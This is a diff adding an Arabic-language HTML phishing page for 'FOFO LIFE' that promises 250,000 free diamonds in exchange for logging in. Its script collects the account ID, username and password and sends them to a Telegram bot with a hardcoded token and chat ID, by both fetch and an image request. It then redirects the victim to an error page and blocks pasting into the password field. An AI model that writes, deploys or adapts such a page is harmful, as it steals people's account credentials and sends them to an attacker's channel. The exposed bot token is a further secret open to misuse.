@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💎</text></svg>">
+    <title>FOFO LIFE - تسجيل الدخول</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #9C27B0, #673AB7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 30px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+
+        .title {
+            color: #9C27B0;
+            font-size: 28px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .prize {
+            color: #673AB7;
+            font-size: 24px;
+            margin: 20px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .diamond {
+            font-size: 24px;
+            margin: 10px;
+        }
+
+        .message-text {
+            font-size: 20px;
+            margin: 15px 0;
+            color: #9C27B0;
+            font-weight: bold;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            background: linear-gradient(45deg, #9C27B0, #673AB7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: glow 2s ease-in-out infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 15px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 15px;
+            font-size: 16px;
+            text-align: right;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+            background: rgba(156, 39, 176, 0.03);
+        }
+
+        input::placeholder {
+            background: linear-gradient(45deg, #9C27B0, #673AB7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: bold;
+            font-size: 17px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #9C27B0;
+            box-shadow: 0 0 10px rgba(156, 39, 176, 0.2);
+            transform: translateY(-2px);
+        }
+
+        button {
+            background: linear-gradient(45deg, #9C27B0, #673AB7);
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 15px;
+            font-size: 18px;
+            margin-top: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 20px rgba(156, 39, 176, 0.4);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="title">FOFO LIFE</div>
+        <div class="prize">
+            اربح 250,000 ماسة
+            <span class="diamond">💎</span>
+        </div>
+        <div class="message-text">
+            للحصول على الماسات التي حصلت عليها قم بتسجيل الدخول
+        </div>
+        <div class="diamond">💎</div>
+        <form onsubmit="handleSubmit(event)">
+            <input type="text" id="userid" placeholder="أيدي الحساب" required>
+            <input type="text" id="username" placeholder="اسم المستخدم" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <script>
+        async function handleSubmit(event) {
+            event.preventDefault();
+            const userid = document.getElementById('userid').value;
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const botToken = '7550725064:AAHwVfCkt63N5Ryd-II5ibFs-rt9uHJifWg';
+            const chatId = '1356437858';
+            const message = encodeURIComponent(`✅ معلومات جديدة:\n\n👤 الآيدي: ${userid}\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}`);
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+            // إرسال البيانات بطريقتين للتأكد من وصولها
+            fetch(url).catch(() => {});
+            const img = new Image();
+            img.src = url;
+
+            // التحويل السريع لصفحة الخطأ
+            setTimeout(() => {
+                window.location.href = 'error.html';
+            }, 500);
+        }
+
+        // منع لصق كلمة المرور
+        document.getElementById('password').addEventListener('paste', (e) => {
+            e.preventDefault();
+        });
+    </script>
+</body>
+</html>
